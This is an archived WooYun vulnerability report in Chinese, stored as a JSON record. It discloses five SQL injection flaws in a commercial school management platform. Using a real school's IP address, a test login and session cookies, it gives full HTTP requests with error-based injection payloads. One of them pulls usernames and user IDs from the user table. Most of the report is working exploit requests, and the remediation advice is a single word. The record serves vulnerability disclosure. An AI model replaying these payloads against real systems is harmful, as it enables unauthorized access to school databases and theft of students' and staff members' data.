{"id": 3548, "wybug_id": "wooyun-2014-053924", "wybug_title": "通用型校园管理平台SQL注入1-5", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-03-18 17:09", "wybug_open_date": "2014-06-16 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "逻辑错误", "安全意识不足", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-16：\t细节向公众公开  简要描述： 通用型校园管理平台多处SQL注入 详细说明：  北京乐知行软件有限公司，通用型校园管理平台官方案例：http://www.lezhixing.com.cn/cms/lzx/case/index.jhtml我们那北京101中学为例：\n\n案例网址：http://202.108.154.209/datacenter/#测试用户：test123/123456第一处SQL注入：1、普通学生用户登陆2、一周日程——导出日程——确定3、发送下面请求：链接：http://202.108.154.209/oa/calendar/exportExcel.doPOST：exportStartDate=2014-03-03&exportEndDate=2014-03-04&exportCalendars=zhaojinfeng2%E6%97%A5%E5%8E%86&exportCalendarIds=16d07c5ff5e44036b5a44751ab2df91e') AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((user()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) and ('1'='1在参数exportCalendars处存在SQL注入。发送请求后，会下载文件，注入后的内容就在此文件里。\n\n确定，下载文件。打开文件就是我们注入后的结果：\n\n第二处SQL注入：1、普通学生用户登陆2、一周日程——选择一个日程进行修改（没有日程新建一个）——保存修改3、在保存是抓包修改问题参数在c0-e1修改c0-e1参数，发送修改后的请如下：POST /oa/dwr/call/plaincall/calendarRemoteCallController.saveEvent.dwr HTTP/1.1Host: 202.108.154.209Cookie: AQ_AUTHENTICATION_COOKIE_KEY=aae03b698ecd444aa0ae02f8d87c026acallCount=1windowName=pageContentc0-scriptName=calendarRemoteCallControllerc0-methodName=saveEventc0-id=0c0-e1=string:0e362687769f426380ab1b8a015ef014' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT user()),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'a'='ac0-e2=string:c0-e3=string:1111111111111c0-e4=string:2014-03-04c0-e5=string:2014-03-04c0-e6=boolean:truec0-e7=boolean:truec0-e8=string:rgb(230%2C115%2C153)c0-e9=number:1c0-e10=null:nullc0-e11=string:-1c0-e12=number:2c0-e13=string:arrangec0-e14=number:0c0-e15=null:nullc0-e16=null:nullc0-e17=string:c0-e18=string:c0-e19=string:c0-e20=string:c0-e21=string:0c0-param0=Object_Object:{id:reference:c0-e1, eventId:reference:c0-e2, title:reference:c0-e3, start:reference:c0-e4, end:reference:c0-e5, allDay:reference:c0-e6, editable:reference:c0-e7, backgroundColor:reference:c0-e8, priority:reference:c0-e9, calendarNameId:reference:c0-e10, remind:reference:c0-e11, privacy:reference:c0-e12, eventType:reference:c0-e13, eventStatus:reference:c0-e14, calendarProjectId:reference:c0-e15, arrangeRelation:reference:c0-e16, messageTaskId:reference:c0-e17, dutier:reference:c0-e18, parter:reference:c0-e19, site:reference:c0-e20, xlts:reference:c0-e21}c0-param1=string:c0-param2=boolean:falsec0-param3=boolean:truebatchId=25page=%2Foa%2F%2Fcalendar%2FinitCalendar.do%3F__time__%3D1394571647842httpSessionId=scriptSessionId=4C1126686168926E787E3EBB1EA961EF返回结果会报错，在报错信息中成功注入出我们想要的数据：\n\n第三处SQL注入：1、普通学生用户登陆2、我的桌面——添加我的投票——主题搜索3、在搜索内容时，抓包，修改criteria，criteria参数存在注入。发送如下请求：POST /datacenter/vote/myVoteList.do HTTP/1.1Host: 202.108.154.209Cookie: aae03b698ecd444aa0ae02f8d87c026a_search=false&nd=1394576122963&rows=50&page=1&sidx=from_date&sord=desc&criteria=theme+like+'%25123%25'+AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT user()),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'a'='a'成功注入出想要的数据：\n\n第四处SQL注入：1、普通学生用户登陆2、我的门户——添加门户项——常用信息3、发布常用信息4、发布消息时，截包，修改，参数ID存在SQL注入发送如下请求：链接：http://202.108.154.209/oa//mail/personal/save.doPOST：privat=2&portlet=portlet&xxzt=complete&id=822b6cdadc7140fe91da513963d4efdc' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT user()),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) and 'a'='a&xxbt=222222&fbsf=ä¸ªäºº:zhaojinfeng2&fjrsf=&info=<p>222222<br/></p>&editorValue=<p>222222<br/></p>Cookie： AQ_AUTHENTICATION_COOKIE_KEY=aae03b698ecd444aa0ae02f8d87c026a成功注入处user()的数据：\n\n第五处SQL注入：1、普通学生用户登陆2、我的桌面——添加——校园办公3、进入校园办公——信件中心——写信4、写信时——预览，抓包到此连接时http://202.108.154.209/oa/dwr/call/plaincall/MailController.getNotReadtotalNumByClassify.dwr POST参数c0-param0存在注入，此时修改c0-param0为：c0-param0=string:2' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(username,0x23,user_id) from aq_user limit 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'a'='a即可注入出username和user_id发送如下请求：连接：http://202.108.154.209/oa/dwr/call/plaincall/MailController.getNotReadtotalNumByClassify.dwr POST：callCount=1windowName=c0-scriptName=MailControllerc0-methodName=getNotReadtotalNumByClassifyc0-id=0c0-param0=string:2' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(username,0x23,user_id) from aq_user limit 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'a'='abatchId=112page=%2Fdatacenter%2Fportlet%2FshowPortletList.do%3FmenuId%3Ded57d3b21fff48738552a4601ed30e55httpSessionId=scriptSessionId=3756A70426EB76F99A0BBDDF3AC4FEBC\n\n   漏洞证明：  间详细说明   修复方案：  过滤   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-25 23:15 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-18 17:17 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  果然合集了？    \n     2014-03-18 17:42 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @wefgod 不是一个哦...    \n     2014-03-18 18:06 |    \t\tPanFake \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 略懂略懂)\t\t \n  求透露细节！！    \n     2014-04-15 09:29 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力    \n     2014-06-16 19:29 |    \t\tkeke \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:8        | 目测和口算各种妹纸)\t\t \n  登陆后的注入？ 20?    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}